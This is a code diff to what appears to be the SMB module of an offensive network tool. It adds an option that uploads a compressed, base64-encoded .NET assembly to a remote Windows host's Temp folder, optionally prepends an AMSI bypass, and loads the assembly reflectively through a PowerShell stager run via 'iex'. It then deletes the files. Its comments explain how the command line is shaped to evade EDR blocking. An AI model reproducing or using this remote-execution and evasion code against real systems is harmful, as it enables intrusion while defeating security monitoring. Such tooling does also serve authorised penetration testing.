@@ -3,8 +3,11 @@
 import socket
 import os
 import re
+import zlib
 import ntpath
-import hashlib,binascii
+import base64
+import tempfile
+import hashlib, binascii
 from io import StringIO
 from impacket.smbconnection import SMBConnection, SessionError
 from impacket.smb import SMB_DIALECT
@@ -39,6 +42,7 @@ from time import time
 from datetime import datetime
 from functools import wraps
 from traceback import format_exc
+from pathlib import Path
 
 smb_share_name = gen_random_string(5).upper()
 smb_server = None
@@ -198,6 +202,9 @@ class smb(connection):
                                                              'map the result with '
                                                              'https://docs.python.org/3/library/codecs.html#standard-encodings and then execute '
                                                              'again with --codec and the corresponding codec')
+        cgroup.add_argument('--dotnetassembly', action='store_true', help='execute a .NET assembly treating the first part of the command as the assembly name')
+        cgroup.add_argument('--dotnetassembly-names', help='a comma-separated string of Namespace,Class,Method to execute')
+        cgroup.add_argument('--dotnetassembly-arg-type', default='array', choices={'array', 'string'}, help='pass the arguments as an array or as a string')
         cgroup.add_argument('--force-ps32', action='store_true', help='force the PowerShell command to run in a 32-bit process')
         cgroup.add_argument('--no-output', action='store_true', help='do not retrieve command output')
         cegroup = cgroup.add_mutually_exclusive_group()
@@ -586,6 +593,67 @@ class smb(connection):
                     continue
 
         if hasattr(self, 'server'): self.server.track_host(self.host)
+
+        if self.args.dotnetassembly:
+            dotnetassembly_path = Path(payload.split()[0])
+            with open(dotnetassembly_path, 'rb') as f:
+                deflate_stream = zlib.compressobj(zlib.Z_DEFAULT_COMPRESSION, zlib.DEFLATED, -15)
+                dotnetassembly_compressed = deflate_stream.compress(f.read())
+                dotnetassembly_compressed += deflate_stream.flush()
+            dotnetassembly_compressed_b64 = base64.b64encode(dotnetassembly_compressed).decode()
+            dotnetassembly_args = ' '.join(payload.split()[1:])
+
+            with tempfile.NamedTemporaryFile('w') as tmp:
+                dotnetassembly_remote_path = f'\\Windows\\Temp\\{gen_random_string(6)}'
+                tmp.write(dotnetassembly_compressed_b64)
+                tmp.flush()
+                self.args.put_file = (tmp.name, dotnetassembly_remote_path)
+                self.put_file()
+
+            amsi_bypass = self.args.amsi_bypass[0] if self.args.amsi_bypass else ''
+            if amsi_bypass:
+                with open(amsi_bypass, 'r') as f:
+                    amsi_bypass = f.read()
+
+            if self.args.dotnetassembly_names:
+                dotnetassembly_names = self.args.dotnetassembly_names.split(',')
+                dotnetassembly_namespace, dotnetassembly_class, dotnetassembly_method = dotnetassembly_names
+            else:
+                dotnetassembly_namespace = dotnetassembly_path.stem
+                dotnetassembly_class = 'Program'
+                dotnetassembly_method = 'Main'
+
+            if self.args.dotnetassembly_arg_type == 'array':
+                dotnetassembly_arg_type = '.Split()'
+            elif self.args.dotnetassembly_arg_type == 'string':
+                dotnetassembly_arg_type = ''
+
+            ps_payload_remote_path = f'\\Windows\\Temp\\{gen_random_string(6)}'
+            ps_payload = amsi_bypass + f'''\
+                $a = [System.IO.File]::ReadAllText("{dotnetassembly_remote_path}")
+                $b = New-Object System.IO.MemoryStream(, [System.Convert]::FromBase64String($a))
+                $c = New-Object System.IO.Compression.DeflateStream($b, [System.IO.Compression.CompressionMode]::Decompress)
+                $d = New-Object System.IO.MemoryStream
+                $c.CopyTo($d)
+                [byte[]]$e = $d.ToArray()
+                $f = [System.Reflection.Assembly]::Load($e)
+                $g = [Reflection.BindingFlags]"Public,NonPublic,Static"
+                $h = $f.GetType("{dotnetassembly_namespace}.{dotnetassembly_class}", $g)
+                $i = $h.GetMethod("{dotnetassembly_method}", $g)
+                $i.Invoke($null, (, "{dotnetassembly_args}"{dotnetassembly_arg_type}))
+                rm {dotnetassembly_remote_path}
+                rm {ps_payload_remote_path}'''
+
+            ps_payload_b64 = base64.b64encode(ps_payload.encode()).decode()
+            with tempfile.NamedTemporaryFile('w') as tmp:
+                tmp.write(ps_payload_b64)
+                tmp.flush()
+                self.args.put_file = (tmp.name, ps_payload_remote_path)
+                self.put_file()
+
+            # 1. Due to EDRs blocking suspicious behavior of WmiPrvSE.exe (e.g., 'cmd /c powershell ...') we want to minimize the length of the PS payload as much as possible. So we IEX the command from a file
+            # 2. Also we do not want to invoke the PS command from base64 as 'powershell -enc ...' because it also often gets blocked. Instead we use FromBase64String
+            payload = f'powershell.exe $a=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([System.IO.File]::ReadAllText(""""{ps_payload_remote_path}"""")));iex $a'
 
         output = exec_method.execute(payload, get_output)
 
